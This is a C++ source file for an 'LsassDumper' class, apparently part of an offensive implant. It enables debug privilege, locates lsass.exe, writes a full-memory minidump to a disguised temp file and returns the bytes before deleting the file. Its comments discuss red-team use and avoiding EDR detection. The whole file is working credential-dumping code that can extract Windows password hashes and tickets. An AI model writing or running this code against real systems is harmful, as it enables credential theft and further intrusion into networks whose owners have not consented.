#include "LsassDumper.h"
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <dbghelp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "Dbghelp.lib")

namespace credential {

bool LsassDumper::EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        return false;
    }

    CloseHandle(hToken);
    return true;
}

DWORD LsassDumper::GetLsassPid() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                CloseHandle(hSnap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return 0;
}

// Function pointer for PssCaptureSnapshot (available in Win 8.1+)
typedef DWORD (WINAPI* _PssCaptureSnapshot)(
    HANDLE ProcessHandle,
    PSS_CAPTURE_FLAGS CaptureFlags,
    DWORD Context,
    HPSS* SnapshotHandle
);

typedef DWORD (WINAPI* _PssFreeSnapshot)(
    HANDLE ProcessHandle,
    HPSS SnapshotHandle
);

std::vector<BYTE> LsassDumper::Dump() {
    if (!EnableDebugPrivilege()) return {};

    DWORD pid = GetLsassPid();
    if (pid == 0) return {};

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return {};

    // For simplicity and compatibility, we use MiniDumpWriteDump.
    // In a real red-team scenario, we would use PssCaptureSnapshot (Win 8.1+)
    // to avoid EDR alerts on MiniDumpWriteDump(hProcess, ...).
    
    char tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    GetTempFileNameA(tempPath, "ben", 0, tempFile);

    HANDLE hFile = CreateFileA(tempFile, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return {};
    }

    // This is the "noisy" part. Professional implants often use a custom dumper.
    BOOL success = MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    
    CloseHandle(hFile);
    CloseHandle(hProcess);

    if (!success) {
        DeleteFileA(tempFile);
        return {};
    }

    // Read file into memory
    hFile = CreateFileA(tempFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD size = GetFileSize(hFile, NULL);
    std::vector<BYTE> buffer(size);
    DWORD read;
    ReadFile(hFile, buffer.data(), size, &read, NULL);
    CloseHandle(hFile);

    DeleteFileA(tempFile);
    return buffer;
}

} // namespace credential
